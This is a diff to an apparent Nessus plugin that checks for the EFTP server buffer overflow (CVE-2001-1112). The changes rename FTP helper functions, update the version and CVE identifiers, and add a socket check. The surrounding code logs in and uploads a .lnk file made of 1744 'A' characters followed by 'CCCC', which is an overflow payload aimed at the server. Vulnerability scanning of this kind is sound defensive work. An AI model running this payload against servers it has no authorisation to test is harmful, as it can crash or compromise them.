@@ -7,9 +7,9 @@
 if(description)
 {
  script_id(10928);
- script_version("$Revision: 1.9 $");
  script_bugtraq_id(3330);
- script_cve_id("CAN-2001-1112");
+ script_version("$Revision: 1.13 $");
+ script_cve_id("CVE-2001-1112");
  name["english"] = "EFTP buffer overflow";
  name["francais"] = "Débordement mémoire dans EFTP";
  script_name(english:name["english"], francais:name["francais"]);
@@ -112,7 +112,7 @@ if (!soc) exit(0);
 
 
 
-r = ftp_log_in(socket:soc, user:user_login, pass:user_passwd);
+r = ftp_authenticate(socket:soc, user:user_login, pass:user_passwd);
 if (!r) 
 {
  ftp_close(socket: soc);
@@ -127,15 +127,13 @@ a = recv_line(socket:soc, length:1024);
 f_name =  string("ness", rand()%10, rand()%10, rand()%10, rand()%10, ".lnk");
 
 # Upload a buggy .LNK
-port2 = ftp_get_pasv_port(socket:soc);
+port2 = ftp_pasv(socket:soc);
 soc2 = open_sock_tcp(port2, transport:get_port_transport(port));
+if ( ! soc2 ) exit(0);
 cmd = string("STOR ", f_name, "\r\n");
 send(socket:soc, data:cmd);
 r = recv_line(socket:soc, length:1024);	# Read the 3 digits ?
-if(ereg(pattern:"^5[0-9][0-9] .*", string:r))
- {
-  exit(0);
- }
+if(ereg(pattern:"^5[0-9][0-9] .*", string:r)) exit(0);
 
 
 d = string(crap(length:1744, data: "A"), "CCCC");
@@ -159,7 +157,7 @@ if (! soc)
 
 if (soc)
 { 
- ftp_log_in(socket:soc, user:user_login, pass:user_passwd);
+ ftp_authenticate(socket:soc, user:user_login, pass:user_passwd);
  cmd = string("CWD ", writeable_dir, "\r\n");
  send(socket:soc, data:cmd);
  r = recv_line(socket:soc, length:1024);
